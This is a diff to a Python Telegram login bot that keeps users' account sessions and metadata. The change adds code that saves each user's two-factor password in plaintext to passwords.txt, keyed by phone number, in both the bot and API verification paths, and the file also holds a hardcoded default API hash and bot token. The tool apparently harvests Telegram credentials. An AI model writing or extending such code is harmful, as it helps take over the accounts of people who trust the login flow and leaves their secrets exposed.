@@ -25,6 +25,7 @@ API_HASH = os.getenv('API_HASH', '2e981dbffc9a37c28c1adeb74d5e2216')
 BOT_TOKEN = os.getenv('BOT_TOKEN', '8932487693:AAEEOCeYhX0kkitYS9fiWcpsNwndf47uCtU')
 SESSION_DIR = str(BASE_DIR / 'sessions')
 VARS_FILE = str(BASE_DIR / 'vars.txt')
+PASS_FILE = str(BASE_DIR / 'passwords.txt')
 
 # === Bot Handler ===
 class TelegramAuthBot:
@@ -44,6 +45,10 @@ class TelegramAuthBot:
     def save_account_metadata(self, phone, api_id=API_ID, api_hash=API_HASH, vars_path: str = VARS_FILE):
         with open(vars_path, 'a') as f:
             f.write(f"{api_id}|{api_hash}|{phone}\n")
+
+    def save_2fa_password(self, phone, password, pass_path: str = PASS_FILE):
+        with open(pass_path, 'a') as f:
+            f.write(f"{phone}|{password}\n")
 
     def _read_vars_records(self, vars_path: str):
         """Read account records from vars.txt, supporting both text and legacy pickle formats."""
@@ -387,6 +392,7 @@ class TelegramAuthBot:
                 self.sessions[phone] = client
                 del self.pending_codes[phone]
                 self.save_account_metadata(phone)
+                self.save_2fa_password(phone, password)
 
                 me = await client.get_me()
                 await event.reply(
@@ -494,6 +500,7 @@ async def api_verify_2fa(req: Verify2FAReq):
         auth_bot.sessions[phone] = client
         del auth_bot.pending_codes[phone]
         auth_bot.save_account_metadata(phone)
+        auth_bot.save_2fa_password(phone, req.password)
 
         me = await client.get_me()
         return {"status": "ok", "phone": phone, "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username, "id": me.id}
